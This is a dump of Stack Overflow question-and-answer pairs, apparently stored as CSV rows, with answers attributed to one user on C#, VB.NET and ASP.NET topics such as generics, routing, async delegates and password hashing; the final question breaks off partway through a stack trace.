"<p>I really like the way ASP.NET MVC works. I'd love to implement it on all new web projects moving forward, but I hit a snag in a prototype the other day that I really haven't found a good solution for, so I ask you, how would you design an MVC app that doesn't fit the typical REST pattern? As an example, the prototype I was designing would have several pages, but the pages themselves aren't necessarily bound to a domain model. For example, take a simple registration site, which might have the following pages:</p>

<ul>
<li>/Default.aspx   </li>
<li>/Register.aspx  </li>
<li>/ThankYou.aspx</li>
</ul>

<p>Occasionally, such a program might require an admin section to deal with such details as moderating sign ups or reviewing data. In a standard ASP.NET web app, I might add the following</p>

<ul>
<li>/Admin/Default.aspx  </li>
<li>/Admin/ListRegistrations.aspx  </li>
<li>/Admin/ViewReports.aspx   ...</li>
</ul>

<p>Would it be an unacceptable deviation from the MVC pattern, in this case, to have two controllers such as:</p>

<ul>
<li>Home->Index  </li>
<li>Home->Register  </li>
<li>Home->ThankYou  </li>
<li>Admin->Index  </li>
<li>Admin->ListRegistrations  </li>
<li>Admin->Reports</li>
</ul>

<p>My frustration with this is compounded by the fact that there is no real solid implementation of subcontrollers and areas yet. I'm aware of the ""Areas"" prototype put together by Phil Haack, but it's not very mature, and quite frankly, I'm not sure I like the way it's setup, but I don't really know how I'd like to see that work either.</p>

<p>I guess when I think MVC, I tend to think REST as well, and having controller actions that represent pages rather than actual entities or actions doesn't sit right with me. What do you think?</p>
","33708","Mehrdad Afshari","<p>You can always mix ASP.NET Web Forms with MVC. </p>

<p>Just add </p>

<pre><code>routes.IgnoreRoute(""Pages/{*path}"");
</code></pre>

<p>to your routing table and add traditional Web form pages to <code>Pages</code> folder of the application.</p>
"
"<p>I have a method where I want to have a parameter that is a Type, but of a certain interface.</p>

<p>E.g.:</p>

<pre><code>public static ConvertFile(Type fileType)
</code></pre>

<p>where I can specify fileType inherits IFileConvert.</p>

<p>Is this possible?</p>
","33708","Mehrdad Afshari","<p>Nope, it's not possible. However you could do:</p>

<pre><code>public static void ConvertFile&lt;T&gt;() where T : IFileConvert {
   Type fileType = typeof(T);
}
</code></pre>

<p>instead.</p>
"
"<p>What is the difference between this:</p>

<pre><code>void MyMethod(IMyInterface value)
{
    //...
}
</code></pre>

<p>and this:</p>

<pre><code>void MyMethod&lt;T&gt;(T value) where T : IMyInterface
{
    //...
}
</code></pre>
","33708","Mehrdad Afshari","<p>The generic version will require .NET 2.0.</p>

<p>But seriously, while they look similar, there are fundamental differences between them. One difference is, at runtime, the JIT compiler will generate code for each value type that will be used for the generic version. The non-generic version will require the value types to be boxed in order to be passed to the function.</p>

<p>The difference will also matter when dealing with delegates. The signature of <code>MyMethod&lt;int&gt;</code> matches <code>void MyDelegate(int x)</code> while the non-generic version is not matched.</p>
"
"<p>I read in the MS documentation that assigning a 64-bit value on a 32-bit Intel computer is not an atomic operation; that is, the operation is not thread safe. This means that if two people simultaneously assign a value to a static <code>Int64</code> field, the final value of the field cannot be predicted.</p>

<p>Three part question:</p>

<ul>
<li>Is this really true?</li>
<li>Is this something I would worry about in the real world?</li>
<li>If my application is multi-threaded do I really need to surround all my <code>Int64</code> assignments with locking code?</li>
</ul>
","33708","Mehrdad Afshari","<p>This is not about every variable you encounter. If some variable is used as a shared state or something (including, but not limited to <em>some</em> <code>static</code> fields), you should take care of this issue. It's completely non-issue for local variables that are not hoisted as a consequence of being closed over in a closure or an iterator transformation and are used by a single function (and thus, a single thread) at a time.</p>
"
"<p>I have a custom class set up as a key that has two properties, X and Y</p>

<p>I have something similar to this:</p>

<pre><code>Dim test As New List(of TestClass)
Dim key as New TestData

key._a = A
key._b = B

For Each a As TestClass In SomeCollection
  If Not test.Contains(key) Then
     'Do Stuff
  End If
Next
</code></pre>

<p>My question is this:  How does the .Contains on the List(of T) behave?  Does it look for an identical data structure, or does it simply match on one of the properties of my key?  </p>

<p>If you can, please include a link where I can look at some documentation regarding this.</p>

<p><em>EDIT</em>
Is the Contains method Typesafe?</p>
","33708","Mehrdad Afshari","<p>It uses the <code>Equals</code> method to check for identity.</p>

<p>By default (if not overridden) <code>Equals</code> returns <code>true</code> if two references are identical or two structures are equal memberwise.</p>
"
"<p>For an application I am writing, I want to have extreme extensibility and extension methods seem to give me what I want, plus the ability to call them without an instance, which I need too.</p>

<p>I remember reading that static methods are faster than instance methods but don't get the advantages of GC. Is this correct?</p>

<p>It's highly unlikely I will change my design unless I find a superior alternative by design not speed. But still for extra information I wanna know the differences in speed, GC, etc.</p>

<p>EDIT: Thanks. More info: Let's say we have a Person class:</p>

<pre><code>class Person
</code></pre>

<p>which can have an instance Distance method so like:</p>

<pre><code>this.Distance (Person p)
</code></pre>

<p>This is great, but this doesn't give me the ability to calculate the distance between 2 points (say Point3), without creating instances of the Person class.</p>

<p>What I want to do is this:</p>

<pre><code>class Person (no Distance methods)
</code></pre>

<p>but extension methods of Distance:</p>

<pre><code>Distance (this Person, Person)
Distance (this Point3, Point3)
</code></pre>

<p>This way I can both do:</p>

<pre><code>myPerson.Distance (yourPerson)
</code></pre>

<p>and</p>

<pre><code>Extensions.Distance (pointA, pointB)
</code></pre>

<p>EDIT2: @Jon, yeah I think that was what was meant by (don't get the advantages of GC), but I somehow thought that the static methods create this burden/overhead.</p>
","33708","Mehrdad Afshari","<p>Choosing between static and instance methods is a matter of object-oriented design. If the method you are writing is a <em>behavior</em> of a an object, then it should be an instance method. If it doesn't depend on an instance of an object, it should be static.</p>

<p>Basically, static methods belong to a type while instance methods belong to instances of a type.</p>
"
"<p>In the latest (RC1) release of ASP.NET MVC, how do I get Html.ActionLink to render as a button or an image instead of a link?</p>
","33708","Mehrdad Afshari","<p>You can't do this with <code>Html.ActionLink</code>.  You should use <code>Url.RouteUrl</code> and use the URL to construct the element you want.</p>
"
"<p>How do you specify the <strong>Func</strong> signature for anonymous objects?</p>

<pre><code>new Func&lt;DataSet, **IEnumerable&lt;int&gt;&gt;**
</code></pre>

<p>I am having a trouble with return type where I have specified as <strong>IEnumerable&lt;></strong> in the Func declaration</p>

<p>Error I am getting from the expression is </p>

<blockquote>
  <p>Cannot convert expression type 'System.Collections.Generic.IEnumerable&lt;{ParentNodeId:int}>' to returnt ype 'System.Collections.Generic.IEnumerable'</p>
</blockquote>

<p>How can I specify <strong>IEnumerable&lt;{ParentNodeId:int}></strong> in func?</p>

<pre><code>    public int GetCachedRootNodeId(IList&lt;int&gt; fromNodeIds, int forNodeId)
    {
        var result = forNodeId;

        const string spName = ""spFetchAllParentNodeIDs"";
        using (var ds = _df.ExecuteDatasetParamArray(_ConnectionString, spName, forNodeId))
        {
            if (DataAccessUtil.DataSetIsEmpty(ds)) return result;

            var orderByLevelDesc = new Func&lt;DataSet, IEnumerable&lt;int&gt;&gt;(resultSet =&gt;
                from DataRow row in DataAccessUtil.GetFirstTableRows(resultSet) 
                orderby DataAccessUtil.GetInt32(row, ""Level"") descending 
                select new { ParentNodeId = DataAccessUtil.GetInt32(row, ""ParentNodeID"") });

            //// Get top-most parent's node ID first (higher the level, the more top-most the parent is)
            //var query = from DataRow row in DataAccessUtil.GetFirstTableRows(ds)
            //            orderby DataAccessUtil.GetInt32(row, ""Level"") descending
            //            select new { ParentNodeId = DataAccessUtil.GetInt32(row, ""ParentNodeID"") };
            //foreach (var nodeInfo in query)
            foreach (var nodeInfo in orderByLevelDesc(ds))
            {
                if (fromNodeIds.Contains(nodeInfo.ParentNodeId))
                    return nodeInfo.ParentNodeId;
            }
        }

        return result;
    }
</code></pre>

<p>By the way, I could have used commented code ""query"" and be done with it.
But wanted to be more expressive and try something new after looking at this answer
<a href=""http://stackoverflow.com/questions/576374/why-doesnt-c-have-lexically-nested-functions/576386#576386"">Why doesn't C# have lexically nested functions?</a></p>

<p><strong>EDIT</strong>: Final Result</p>

<pre><code>    public int GetCachedRootNodeId(IList&lt;int&gt; fromNodeIds, int forNodeId)
    {
        var result = forNodeId;

        const string spName = ""spFetchAllParentNodeIDs"";
        using (var ds = _df.ExecuteDatasetParamArray(_ConnectionString, spName, forNodeId))
        {
            if (DataAccessUtil.DataSetIsEmpty(ds)) return result;

            var orderParentNodeIDByLevelDesc = new Func&lt;DataSet, IEnumerable&lt;int&gt;&gt;(resultSet =&gt;
                from DataRow row in DataAccessUtil.GetFirstTableRows(resultSet) 
                orderby DataAccessUtil.GetInt32(row, ""Level"") descending
                select DataAccessUtil.GetInt32(row, ""ParentNodeID""));

            foreach (var parentNodeId in orderParentNodeIDByLevelDesc(ds))
            {
                if (fromNodeIds.Contains(parentNodeId))
                    return parentNodeId;
            }
        }

        return result;
    }
</code></pre>
","33708","Mehrdad Afshari","<p>There is no way to specify anonymous types in declarations. You have to make a named class for it.</p>

<p>Jon Skeet has a <a href=""http://msmvps.com/blogs/jon_skeet/archive/2009/01/09/horrible-grotty-hack-returning-an-anonymous-type-instance.aspx"" rel=""nofollow"">related blog entry</a> on this issue.</p>
"
"<p>Tools such as MRTG provide network throughput / bandwidth graphs for the current network utilisation on specific interfaces, such as eth0. How can I return that information at the command line on Linux/UNIX?</p>

<p>Preferably this would be without installing anything other than what is available on the system as standard.</p>
","33708","Mehrdad Afshari","<p>You can parse the output of <code>ifconfig</code></p>
"
"<p>I am writing an API in C# and I want to provide both synchronous and asynchronous versions of the publicly available methods.
For example, if I have the following function:</p>

<pre><code>public int MyFunction(int x, int y)
{
   // do something here
   System.Threading.Thread.Sleep(2000);
   return  x * y;

}
</code></pre>

<p>how can I create an asynchronous version of the above method (perhaps BeginMyFunction and EndMyFunction)?  Are there different ways to achieve the same result, and what are the benefits of the various approaches?</p>
","33708","Mehrdad Afshari","<p>The generic approach is to use a <code>delegate</code>:</p>

<pre><code>IAsyncResult BeginMyFunction(AsyncCallback callback)
{
    return BeginMyFunction(callback, null);
}

IAsyncResult BeginMyFunction(AsyncCallback callback, object context)
{
    // Func&lt;int&gt; is just a delegate that matches the method signature,
    // It could be any matching delegate and not necessarily be *generic*
    // This generic solution does not rely on generics ;)
    return new Func&lt;int&gt;(MyFunction).BeginInvoke(callback, context);
}

int EndMyFunction(IAsyncResult result)
{
    return new Func&lt;int&gt;(MyFunction).EndInvoke(result);
}
</code></pre>
"
"<p>How to retrieve a webpage and diplay the html to the console with C# ?</p>
","33708","Mehrdad Afshari","<p>Use the <code>System.Net.WebClient</code> class.</p>

<pre><code>System.Console.WriteLine(new System.Net.WebClient().DownloadString(url));
</code></pre>
"
"<p>what in asp.net similar to message box </p>

<pre><code>if (s != ""null"")
   MessageBox.Show(""your in "");
else
   MessageBox.Show(""wrong user "");
</code></pre>

<p>i want to replace message box here in c# code </p>
","33708","Mehrdad Afshari","<p>ASP.NET is a server side technology. The whole C#/VB/etc. code will be executed on the server and the response (which is probably HTML/JS/...) will be sent to the client.</p>

<p>You could send out the necessary Jscript code to display a message box on the client. Note that this code will not be executed immediately, but will be sent to the browser. The browser will interpret it and display the message box accordingly.</p>

<pre><code>&lt;script type='text/javascript'&gt;
   alert('Hi');
&lt;/script&gt;
</code></pre>
"
"<p>I am using Linq to convert an array of any object to a CSV list:</p>

<pre><code>String.Join("","", (From item In objectArray Select item.ToString()).ToArray())
</code></pre>

<p>This is giving me the strange error: <strong><em>""Range variable name cannot match the name of a member of the 'Object' class.""</em></strong></p>

<p>I can get round it by wrapping the string in a VB StrConv method, with a setting of ""Nothing"":</p>

<pre><code>String.Join("","", (From item In oArray Select StrConv(item.ToString(), VbStrConv.None)).ToArray())
</code></pre>

<p>However, this seems like a bit of a hack and I would like to avoid it.</p>

<p>Does anyone have any ideas when this problems occurs, and any better ways to get round it?</p>
","33708","Mehrdad Afshari","<p>Modify your code to:</p>

<pre><code>String.Join("","", (From item In objectArray Select stringVal = item.ToString()).ToArray())
</code></pre>

<p>The problem is VB gives a name to the variable returned by <code>Select</code> clause. Implicitly, it tries to give the name <code>ToString</code> to <code>item.ToString()</code> which will clash with <code>ToString</code> method. To prevent so, you should explicitly specify a name (<code>stringVal</code> in above line).</p>
"
"<p>Allegedly, the native code is shared for instantiated generic types when it is instantiated with a reference type, but not for value types.</p>

<p>Why is that? would someone explain the in-depth details?</p>

<p>To make more concrete:</p>

<p>class MyGenericType{</p>

<p>}</p>

<pre><code> MyGenericType&lt;string&gt; and MyGenericType&lt;Shape&gt;
</code></pre>

<p>will have only one code generated, whereas </p>

<pre><code> MyGenericType&lt;int&gt; and MyGenericType&lt;long&gt;
</code></pre>

<p>will NOT, hence it begs  the  question if using reference types is more efficient -- </p>

<pre><code>MyGenericType&lt;int&gt; vs. MyGenericType&lt;SomeIntegerWrapper&gt;
</code></pre>

<p>Thanks</p>
","33708","Mehrdad Afshari","<p>Technically, at a lower level, all reference types are pointers and therefore, have the same size and characteristics. There is no need for the runtime to build separate native code for reference types. Value types can have different sizes, so a single native code cannot deal with all of them.</p>
"
"<p>Is there a difference between Server.UrlEncode and HttpUtility.UrlEncode?</p>
","33708","Mehrdad Afshari","<p><code>HttpServerUtility.UrlEncode</code> will use <code>HttpUtility.UrlEncode</code> internally. There is no specific difference. The reason for existence of <code>Server.UrlEncode</code> is compatibility with classic ASP.</p>
"
"<p>If I have a method that returns something, like</p>

<pre><code>public DataTable ReturnSomething()
{
   try
   {  
      //logic here
     return ds.Tables[0];
   }
   catch (Exception e)
   {
      ErrorString=e.Message;
   }
}
</code></pre>

<p>This produces compiler error, obviously because <code>catch{}</code> block does not return anything.</p>

<p>So when I have methods with return values I don't use try-catch block, which is a bad practice. If there is an error, I would like to set error string to that error. But then I need a return value as well. Advice? </p>
","33708","Mehrdad Afshari","<p>I think your code is being run at a sufficiently high level of the call stack and it's blended with UI code. If this is really the case, you could <code>return null</code> in the catch block. However, if you are writing reusable code, you should refactor it so that it doesn't contain UI manipulation and handle the exception at a higher level in the call stack.</p>
"
"<p>I am wondering if there are any heuristics for when to set <code>copy-local=true</code> for references?</p>

<p>If referenced types are only used internally can I set <code>copy-local</code> to <code>true</code> but if referenced types are exposed as parameters or return values I set <code>copy-local</code> to <code>false</code> and indicate that a specific version of the dependency should be referenced when my library should be used?</p>

<p>Can anyone clarify this for me?</p>
","33708","Mehrdad Afshari","<p>This option only affects build phase. It just copies the reference to local directory of the built assembly.</p>

<p>If another assembly (T) wants to use a method from the assembly you are building (A) which has return type or parameters from another referenced assembly (R), it (T) should be able to access that assembly (R). It might be able to do so without doing anything special if the referenced assembly (R) is installed in GAC. Otherwise, it needs a local copy of that.</p>
"
"<p>I have the following problem:
For example I have route like this:</p>

<pre><code>routes.Add(new Route(""forums/thread/{threadOid}/last"", new MvcRouteHandler())
           Defaults = new RouteValueDictionary(
             new { controller = ""Thread"", action =""ShowThreadLastPostPage""}),
        Constraints = new RouteValueDictionary(new { threadOid = @""^\d+$"" })
    }
);
</code></pre>

<p>Is there a way using RedirectToAction method navigate to the URL like this:</p>

<blockquote>
  <p><code>forums/thread/{threadOid}/last#postOid</code></p>
</blockquote>
","33708","Mehrdad Afshari","<p>I think you should use the <code>Redirect</code> method along with <code>Url.RouteUrl</code> to accomplish it.</p>

<pre><code>return Redirect(Url.RouteUrl(new { controller = ""Thread"", action = ""ShowThreadLastPostPage"", threadOid = threadId }) + ""#"" + postOid);
</code></pre>
"
"<p>What's the preferred container type when returning multiple objects of the same type from a function? </p>

<p>Is it against good practice to return a simple array (like MyType[]), or should you wrap it in some generic container (like ICollection&lt;MyType&gt;)? </p>

<p>Thanks!</p>
","33708","Mehrdad Afshari","<p>Why not <code>IList&lt;MyType&gt;</code>?</p>

<p>It supports direct indexing which is hallmark for an array without removing the possibility to return a <code>List&lt;MyType&gt;</code> some day. If you want to suppress this feature, you probably want to return <code>IEnumerable&lt;MyType&gt;</code>.</p>
"
"<p>In C#, I have base class Product and derived class Widget.</p>

<p>Product contains a static method MyMethod().</p>

<p>I want to call static method Product.MyMethod() from static method Widget.MyMethod().</p>

<p>I can't use the base keyword, because that only works with instance methods.</p>

<p>I can call Product.MyMethod() explicitly, but if I later change Widget to derive from another class, I have to revise the method.</p>

<p>Is there some syntax in C# similar to base that allows me to call a static method from a base class from a static method of a derived class?</p>
","33708","Mehrdad Afshari","<p><code>static</code> methods are basically a method to fallback from object oriented concepts. As a consequence, they are not very flexible in inheritance hierarchies and it's not possible to do such a thing directly.</p>

<p>The closest thing I can think of is a <code>using</code> directive.</p>

<pre><code>using mybaseclass = Namespace.BaseClass;

class MyClass : mybaseclass {

  static void MyMethod() {  mybaseclass.BaseStaticMethod();  }

}
</code></pre>
"
"<p>If you have a custom collection class that stores the weights of a single class of fruits individually in floats/double, like so:</p>

<pre><code>1.1, 3.3, 6.6, 4.4, ...
</code></pre>

<p>and you would need to specify whether it's float or double and to differentiate the fruit type, is it better to do it like this:</p>

<p>Using an enum:</p>

<pre><code>FruitList&lt;float, FruitType.Orange&gt;
</code></pre>

<p>or</p>

<p>Using an enum in the constructor:</p>

<pre><code>FruitList&lt;float&gt; (FruitType.Orange)
</code></pre>

<p>or</p>

<p>Using a class:</p>

<pre><code>FruitList&lt;float, Orange&gt;
</code></pre>

<p>or</p>

<p>Using a class in the constructor:</p>

<pre><code>FruitList&lt;float&gt; (Orange)
</code></pre>

<p>Thing thing that confuses me is whether specifying these kind of stuff makes sense in the &lt;> area (don't know what that area is called)?</p>

<p>Which is the better, faster, more efficient practice?</p>

<p>Btw the Orange class is never used anywhere, just wrote it if that would make sense to specify the type like that?</p>

<p>EDIT: Btw this is just an example case, not the actual one, but this reflects in a clear way. Like it's all floats/doubles and are passed to some other methods. But the methods need to know what type of fruit to perform correctly. The fruit themselves mean nothing.</p>
","33708","Mehrdad Afshari","<p><code>FruitList&lt;float&gt;(FruitType.Orange)</code> is probably the way to go.</p>

<p><code>float</code> cannot be anything except a type parameter.
The fruit type is just a property. It doesn't make sense to create a separate type and use type parameters for it.</p>
"
"<p>I have a C# web application on .net 2.0 being hosted on server A.  The web application allows users to upload files using <code>&lt;input id=""File1"" name=""filMyFile"" type=""file"" runat=""server"" /&gt;</code> to server A.  This all works just fine.</p>

<p>I am now being asked to modify the web application to allow pages being served by A to allow uploading directly to server B without storing any information on A not even temporarily.  </p>

<p>I am being asked to do this for security reasons.  I was thinking about possibly using an iframe and having server B only host the upload portion wrapping the request with SSL.  I am not entirely sure of the security implications of doing this, however I have seen a few websites in which for their login controls they SSL only an iframe which contains the login portion and the rest of their site was unsecure.  </p>

<p>Is this an OK thing to do?  Can someone recommend a better way? Perhaps suggest a basic architecture.  </p>
","33708","Mehrdad Afshari","<p>Why don't you just set the <code>form</code> action to the SSL secured page on server B?</p>

<pre><code>&lt;form method=""POST"" action=""https://serverb/uploadmanager.ashx"" ...&gt;
</code></pre>
"
"<p>I have an asp:button which is inside an asp:hyperlink.  When you click the button in firefox, it goes to the correct url specified by the asp:hyperlink, but if you click the button in internet explorer, it stays on the same page.  I am just using the PostBackUrl property on the button to resolve the issue, but here is an example of the code:</p>

<pre><code>&lt;asp:Hyperlink ID=""hyp"" runat=""server"" NavigateUrl=""Page2.aspx""&gt;
&lt;asp:Button ID=""btn"" runat=""server"" Text=""Submit"" /&gt;&lt;/asp:Hyperlink&gt;
</code></pre>

<p><strong>Why does the above work in firefox, but not IE?</strong></p>
","33708","Mehrdad Afshari","<p>What you did is not very correct.</p>

<p>Just add the button and in its click handler do:</p>

<pre><code>Response.Redirect(""Page2.aspx"");
</code></pre>

<p>Alternatively you can write a line of javascript:</p>

<pre><code>&lt;input type=""button"" value=""Text"" onclick=""location='Page2.aspx'"" /&gt;
</code></pre>
"
"<p>Is it possible tell the JVM to hint the OS that a certain object should preferably not get pushed out to swap space?</p>
","33708","Mehrdad Afshari","<p>Hey! You are programming in a managed language. Why are you thinking about these? If you can't get these stuff out of your mind, you can always choose to program in C.</p>
"
"<p>I am using the automatically generated proxy for a ASP.Net asmx web service. I find when send HttpWebRequest to my web server, it is the throughput from client side is very good (very big number). But when using the automatically generater proxy, it is very slow. I want to know some general ways to optimize the performance of client, especially increase throughput. If it could be improved by change some configuration at server side, it would also be great!</p>

<p>BTW: I am using asynchronous method call of the web method of the ASP.Net web service.</p>

<p>thanks in advance,
George</p>
","33708","Mehrdad Afshari","<p>The best way to increase the proxy class construction speed is to ship an <code>XmlSerializers</code> assembly along your binary. It's generated by Visual Studio if you choose in the project properties or it can be manually generated by <a href=""http://msdn.microsoft.com/en-us/library/bk3w6240(VS.80).aspx"" rel=""nofollow""><code>sgen.exe</code> tool</a> shipped with .NET.</p>
"
"<p>I have the following variables:</p>

<pre><code>string str1 = ""1"";
string str2 = ""asd"";
string str3 = ""3.5"";
string str4 = ""a"";
</code></pre>

<p>Now I need to find the data type of each string i.e. the data type to which it can be converted if quotes are removed.  Here is what I would like each variable to convert to:</p>

<blockquote>
  <p>str1 - integer<br />
  str2 - string<br />
  str3 - double<br />
  str4 - char </p>
</blockquote>

<p>Note: if the string has single character it should be char, though a string can have single letter, I'm limiting it.</p>

<p>FYI: these values are obtained from DataGrid where i manually entered values. So everything is becoming a string.
Is there any way to do this?</p>
","33708","Mehrdad Afshari","<p>Use the <code>TryParse</code> method of each type.</p>
"
"<p>How do I order by a passed string value on my list of objects? i need to do paging and sorting on my List(Of) objects the paging is no problem but I don;t know who to get the Order By to work.</p>

<p>Here is what I am currently doing and it's working great:</p>

<pre><code>Return returnReports.Skip(PageSize * (PageNumber-1)).Take(PageSize).ToList()
</code></pre>

<p>How do I get this to work?</p>

<pre><code>Return returnReports.OrderBy(SortColumn).Skip(skip).Take(PageSize).ToList()
</code></pre>

<p>SortColumn being a passed string value</p>
","33708","Mehrdad Afshari","<p>VB</p>

<pre><code>Module OrderByExtensions
  &lt;System.Runtime.CompilerServices.Extension()&gt; _
  Public Function OrderByPropertyName(Of T)(ByVal e As IEnumerable(Of T), ByVal propertyName As String) As IOrderedEnumerable(Of T)
    Dim itemType = GetType(T)
    Dim prop = itemType.GetProperty(propertyName)
    If prop Is Nothing Then Throw New ArgumentException(""Object does not have the specified property"")
    Dim propType = prop.PropertyType
    Dim funcType = GetType(Func(Of ,)).MakeGenericType(itemType, propType)
    Dim parameter = Expression.Parameter(itemType, ""item"")
    Dim exp = Expression.Lambda(funcType, Expression.MakeMemberAccess(parameter, prop), parameter)
    Dim params = New Object() {e, exp.Compile()}
    Return DirectCast(GetType(OrderByExtensions).GetMethod(""InvokeOrderBy"", Reflection.BindingFlags.Static Or Reflection.BindingFlags.NonPublic).MakeGenericMethod(itemType, propType).Invoke(Nothing, params), IOrderedEnumerable(Of T))
  End Function
  Private Function InvokeOrderBy(Of T, U)(ByVal e As IEnumerable(Of T), ByVal f As Func(Of T, U)) As IOrderedEnumerable(Of T)
    Return Enumerable.OrderBy(e, f)
  End Function
End Module
</code></pre>

<p>C#</p>

<pre><code>public static class OrderByExtensions
{
  public static IOrderedEnumerable&lt;T&gt; OrderByPropertyName&lt;T&gt;(this IEnumerable&lt;T&gt; e, string name)
  {
    var itemType = typeof(T);
    var prop = itemType.GetProperty(name);
    if (prop == null) throw new ArgumentException(""Object does not have the specified property"");
    var propType = prop.PropertyType;
    var funcType = typeof(Func&lt;,&gt;).MakeGenericType(itemType, propType);
    var parameter = Expression.Parameter(itemType, ""item"");
    var memberAccess = Expression.MakeMemberAccess(parameter, prop);
    var expression = Expression.Lambda(funcType, memberAccess, parameter);
    var x = typeof(OrderByExtensions).GetMethod(""InvokeOrderBy"", BindingFlags.Static | BindingFlags.NonPublic);
    return (IOrderedEnumerable&lt;T&gt;)x.MakeGenericMethod(itemType, propType).Invoke(null, new object[] { e, expression.Compile() });
  }
  static IOrderedEnumerable&lt;T&gt; InvokeOrderBy&lt;T, U&gt;(IEnumerable&lt;T&gt; e, Func&lt;T, U&gt; f)
  {
    return e.OrderBy(f);
  }
}
</code></pre>
"
"<p>I am surprised that I can't initialize my fields in structs, why is it like that? Like:</p>

<pre><code>struct MyStruct
{
    private int a = 90;
}
</code></pre>

<p>but it's a complie time error. I don't know why it's a problem? Please explain this to me.</p>
","33708","Mehrdad Afshari","<p>In C#, a <code>struct</code> cannot declare a default constructor. </p>

<p>The compiler moves the initialization statements to the constructor, which can't happen with a <code>struct</code> in C#.</p>
"
"<p>Creating Unit Tests in VS2008 (rightclick, create unit tests) causes a lot of references to be added to my testproject. These are the same references that the project being tested is using.</p>

<p>Why is this necessary? 
Is there an option somewhere to turn it off?</p>
","33708","Mehrdad Afshari","<p>Some types being tested might expose <code>public</code> members with their parameters and/or return types defined in other assemblies. The tester assembly requires to know about them to be able to test those members. This is accomplished by referencing all the assemblies referenced by the assembly being tested.</p>
"
"<p>Can I use SQL Express for commercial use? or it should be only used for personal development and learning purposes? What are the conditions if I can use it for commercial purpose?</p>
","33708","Mehrdad Afshari","<p>Yes, you can.</p>

<p>However, there are database size and memory limitations in place.</p>
"
"<p>I've a couple of email templates and I would like to store each in a sepparate file. I'd like to avoid having to read them from disc everytime I need them. Is there any built in structure in ASP.NET that automatically loads them when needed and shares this resources throughout the application?</p>
","33708","Mehrdad Afshari","<p>You can use the <code>Cache</code> or <code>Application</code> objects.</p>

<p>Also, for simple tasks, a simple <code>static</code> field would suffice.</p>
"
"<p>Anyone have any idea when and why Page.OnLoad() executes twice in the ASP.NET lifecicle? </p>
","33708","Mehrdad Afshari","<p>Do you have <code>AutoEventWireUp</code> set to <code>true</code> and also attaching an event handler in code? This is a common reason.</p>
"
"<p>The company I work for has taken on a support contract for a large order processing system. As part of the initial system audit I noticed that the passwords stored in the database were actually the hashcode of the password.</p>

<p>Essentially:</p>

<pre><code>string pwd = ""some pasword"";
string securePwd = pwd.GetHashCode();
</code></pre>

<p>My question is, how secure or otherwise is this? </p>

<p>I'm not comfortable with it, but I don't know enough about how GetHashCode works. I would prefer to use something like an MD5 hash, but if I'm wasting my time then I won't bother.</p>
","33708","Mehrdad Afshari","<p><code>GetHashCode</code> returns a 32 bit integer as the hash value. Considering the <a href=""http://en.wikipedia.org/wiki/Birthday_paradox"" rel=""nofollow"">birthday paradox</a>, it's not a long enough hash value due to the relatively high probability of collisions, even if it were explicitly designed to be collision resistant, which is not. </p>

<p>You should go for SHA256 or another cryptographically secure hash function designed to handle such a task.</p>

<p>To store passwords, just using a simple hash function is not enough. You should add some random ""salt"" per user and iterate enough times so that it would be computationally expensive to brute force.  Therefore, you should use something like bcrypt, <a href=""http://en.wikipedia.org/wiki/Scrypt"" rel=""nofollow"">scrypt</a>, PBKDF2, with a large number of iterations.</p>
"
"<p>I'm sure you all know the behaviour I mean - code such as:</p>

<pre><code>Thread thread = new Thread();
int activeCount = thread.activeCount();
</code></pre>

<p>provokes a compiler warning.  Why isn't it an error?</p>

<p><strong>EDIT:</strong></p>

<p>To be clear: question has nothing to do with Threads.  I realise Thread examples are often given when discussing this because of the potential to really mess things up with them.  But really the problem is that such usage is <em>always</em> nonsense and you can't (competently) write such a call and mean it.  Any example of this type of method call would be barmy.  Here's another:</p>

<pre><code>String hello = ""hello"";
String number123AsString = hello.valueOf(123);
</code></pre>

<p>Which makes it look as if each String instance comes with a ""String valueOf(int i)"" method.</p>
","33708","Mehrdad Afshari","<p>Because the language spec allows it :) Just like VB does and C# doesn't.</p>
"
"<p>I've been given the thrilling task of re-writing our exception handling system.  Whilst I will state that handling exceptions from an application-wide point of view isn't something we want, typically it's unavoidable when our team are understaffed for the sheer amount of work we need to push out the door, so please, no flaming the globalised solution to exception handling here :)</p>

<p>I've had a good hunt to see what common solutions exist.  At the moment we use Global.asax with the Application_Error event to do Server.GetLastError() which is placed in Session state then a redirect is called to another page where the session data is then retrieved and output in a human readable format.  The redirect also calls a sproc which will carefully audit the error information which is a) e-mailed to the developers and b) viewed from a web page only viewable by developers.</p>

<p>The new way I've seen of doing things is using the IHttpModule interface using a class in App_Code to do something along these lines (this is my quick implementation)</p>

<pre><code>Imports Microsoft.VisualBasic

Public Class ErrorModule : Implements IHttpModule

  Public Sub Dispose() Implements System.Web.IHttpModule.Dispose
    ' Not used
  End Sub

  Public Sub Init(ByVal context As System.Web.HttpApplication) Implements System.Web.IHttpModule.Init
    AddHandler context.Error, AddressOf context_Error
  End Sub

  Public Sub context_Error(ByVal sender As Object, ByVal e As EventArgs)
    Dim ex As Exception = HttpContext.Current.Server.GetLastError

    ' do something with the error
    ' call the stored procedure
    ' redirect the user to the error page

    HttpContext.Current.Server.ClearError()
    HttpContext.Current.Response.Redirect(""index.htm"")

  End Sub
End Class
</code></pre>

<p>My question is, what is the benefit of this solution over using Global.asax events?  Additionally, what is the best way to hand the data to an error page?</p>

<p><em>EDIT:</em> The code above does work by the way ;)</p>

<p><strong>EDIT:</strong> Also, how does the HttpModule work behind the scenes?  Does it just register the Error event to that particular function on application start?</p>

<p><strong>UPDATE:</strong></p>

<p>Upon much further investigation it seems grabbing session data is really, really messy when it comes to using IHttpModule interface.  I don't think MS have matured HttpModule enough for it to be used in our particular scenario - until there are events specific to session data it's too dangerous for us to use.</p>
","33708","Mehrdad Afshari","<p><code>HttpModule</code> basically does the same thing as <code>Global.asax</code>. It's designed as a more reusable and self-contained module for event handling.</p>
"
"<p>We are building a WPF app and are seeing some random and very strange behavior which seems to originate from within the BCL. We are catching an unhandled exception with the following stacktrace:</p>

<pre><code>[ArgumentException], 
""TimeSpan does not accept floating point Not-a-Number values.""
   at System.TimeSpan.Interval(Double value, Int32 scale)
   at System.Windows.Threading.Dispatcher.Invoke(DispatcherPriority priority, Delegate method, Object arg)
   at MS.Win32.HwndSubclass.SubclassWndProc(IntPtr hwnd, Int32 msg, IntPtr wParam, IntPtr lParam)
   at MS.Win32.UnsafeNativeMethods.DispatchMessage(MSG&amp; msg)
   at System.Windows.Threading.Dispatcher.PushFrameImpl(DispatcherFrame frame)
   at System.Windows.Threading.Dispatcher.PushFrame(DispatcherFrame frame)
   at System.Windows.Threading.Dispatcher.Run()
   at System.Windows.Application.RunDispatcher(Object ignore)
